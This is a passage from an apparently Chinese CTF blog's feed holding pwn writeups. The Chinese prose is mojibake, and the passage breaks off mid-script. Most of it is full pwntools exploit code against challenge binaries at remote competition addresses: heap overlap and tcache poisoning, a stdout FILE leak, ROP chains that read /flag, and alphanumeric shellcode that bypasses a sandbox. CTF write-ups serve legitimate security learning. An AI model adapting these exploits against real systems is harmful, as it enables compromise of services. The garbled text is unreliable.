class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;139.155.126.78&#x27;,16215)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size:&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;context: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def gift():</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;choose:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line"></span><br><span class="line">add(0,0x18)  #0</span><br><span class="line">add(1,0x68)  #1</span><br><span class="line">add(2,0x68)  #2</span><br><span class="line">add(3,0x18)  #3</span><br><span class="line">edit(0,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(4,0xd8)  </span><br><span class="line">gift()</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">pie_base=int(p.recv(12),16)-0x202160</span><br><span class="line">li(hex(pie_base))</span><br><span class="line">free(2)</span><br><span class="line">edit(4,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(pie_base+0x202020)) </span><br><span class="line">add(5,0x68)</span><br><span class="line">add(6,0x68)</span><br><span class="line">add(7,0x68)</span><br><span class="line">edit(7,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span><br><span class="line">libc_base=get_addr64()-0x3ed8b0</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">environ=libc_base+libc.sym[&#x27;environ&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(&quot;jmp rsp&quot;)).__next__()</span><br><span class="line">free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]+53</span><br><span class="line">open_addr=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read_addr=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write_addr=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">shell=p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)</span><br><span class="line">stdout_attack=p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)</span><br><span class="line">edit(7,stdout_attack)</span><br><span class="line">stack=get_addr64()-280</span><br><span class="line">li(hex(stack))</span><br><span class="line"></span><br><span class="line">add(8,0x18)</span><br><span class="line">add(9,0x58)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x18)</span><br><span class="line"></span><br><span class="line">edit(8,b&#x27;\x00&#x27;*0x18+p8(0xc1))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">add(12,0xb8)</span><br><span class="line">free(10)</span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x58+p64(0x61)+p64(stack-0x10))</span><br><span class="line">shell=p64(rdi)+p64(0)+p64(rsi)+p64(stack+64)+p64(rax)+p64(0)+p64(syscall)</span><br><span class="line">add(13,0x58)</span><br><span class="line">add(14,0x58)</span><br><span class="line">flag=stack</span><br><span class="line">reads=b&#x27;/flag\x00\x00\x00&#x27;*3+shell</span><br><span class="line">#bug()</span><br><span class="line">edit(14,reads)</span><br><span class="line"></span><br><span class="line">#pause()</span><br><span class="line">sleep(0.1)</span><br><span class="line">orw = p64(rdi) + p64(flag)  #/flagçš„å­—ç¬¦ä¸²ä½ç½®ï¼Œè¦æ”¹</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rdx) + p64(0x50)</span><br><span class="line">orw += p64(rsi)+p64(flag+0x500) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rdx) + p64(0x50)</span><br><span class="line">orw += p64(rsi)+p64(flag+0x500) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="pwn1">pwn1</h3><p>æºé²æ¯åŸé¢˜</p><p>[Round 1] canary_orw</p><p>jmp rspï¼Œç›´æ¥ç»™æˆ‘ä»¬0x15å­—èŠ‚çš„æº¢å‡ºï¼Œæ§åˆ¶å‡½æ•°è¿”å›åˆ°vulnï¼Œå¹¶ä¸”æ‰§è¡Œjmp rspï¼Œå¹¶å†™å…¥shellcodeï¼Œè¿”å›æ ˆé¡¶ï¼Œæ„é€ readï¼Œè¯»å…¥orwï¼Œè·å–flagï¼Œä¸­é—´æœ‰ä¸ªä»»æ„åœ°å€å†™ï¼Œå†™çš„æ—¶å€™å¿˜äº†åˆ©ç”¨äº†ï¼Œè¦ä¸ç„¶å‡ºçš„æ›´å¿«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">    p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">    p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">    #print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">    return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">    return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">    return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;challenge.yuanloo.com&#x27;,29329)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">vuln=0x400820</span><br><span class="line">jmp_rsp=0x40081B</span><br><span class="line">rl(&quot;Say some old spells to start the journey\n&quot;)</span><br><span class="line"></span><br><span class="line">payload =p64(vuln)+p64(jmp_rsp)</span><br><span class="line">payload+=asm(&#x27;&#x27;&#x27;</span><br><span class="line">xchg rsi,rsp</span><br><span class="line">jmp rsp</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">pr(hex(len(payload)))</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">rl(&quot;Tell me the location of the Eye of the Deep Sea\n&quot;)</span><br><span class="line">s(b&#x27;a&#x27;*8)</span><br><span class="line">rl(&quot;I have magic\n&quot;)</span><br><span class="line">payload=asm(&#x27;&#x27;&#x27;</span><br><span class="line">sub rsp,0x30</span><br><span class="line">jmp rsp</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">s(payload)</span><br><span class="line">rl(&quot;Let&#x27;s go!\n&quot;)</span><br><span class="line">payload=asm(&#x27;&#x27;&#x27;</span><br><span class="line">sub rsi,0x2a</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">pay=asm(&#x27;&#x27;&#x27;    </span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    push SYS_openat</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    push 0</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov r10, 0x100</span><br><span class="line">    push SYS_sendfile</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h5 id=""></h5>]]></content>
    
    
    <summary type="html">2024æ¥šæ…§æ¯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024å›½åŸæ¯</title>
    <link href="https://www.thir0th.xyz/posts/193fa7da.html"/>
    <id>https://www.thir0th.xyz/posts/193fa7da.html</id>
    <published>2025-04-20T06:39:35.000Z</published>
    <updated>2025-05-07T08:47:22.421Z</updated>
    
    <content type="html"><![CDATA[<h1>2024å›½åŸæ¯</h1><h3 id="çº¿ä¸Š">çº¿ä¸Š</h3><h4 id="Alpha-Shell">Alpha_Shell</h4><p>å¯è§å­—ç¬¦shellcodeï¼Œå¹¶ä¸”å¼€å¯æ²™ç›’ï¼Œç”¨openat+sendlifeçš„shellcodeï¼Œå¹¶ç”¨ae64è½¬ä¸ºå¯è§å­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31890</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x15AF)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">rl(<span class="string">&quot;Radiant powers, deadly tech. Here we go!&quot;</span>)</span><br><span class="line">pay=(<span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">sub rdi, 100</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor r10, r10</span></span><br><span class="line"><span class="string">push SYS_openat</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 3</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rdx, rsp</span></span><br><span class="line"><span class="string">mov r10, 0x100</span></span><br><span class="line"><span class="string">push SYS_sendfile</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(pay),<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br><span class="line"></span><br><span class="line">s(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="beverage-store">beverage store</h4><p>å­˜åœ¨å±äºæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¾“å…¥è´Ÿæ•°ï¼Œgotè¡¨å¯æ‰“ï¼Œå…ˆä¿®æ”¹exitä¸ºmainï¼Œåç»­è®¡ç®—åç§»æ³„éœ²libcåœ°å€ï¼Œæœ€åæ”»å‡»printfçš„ä¸ºsystemï¼Œè¿”å›åé—¨è·å–shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span 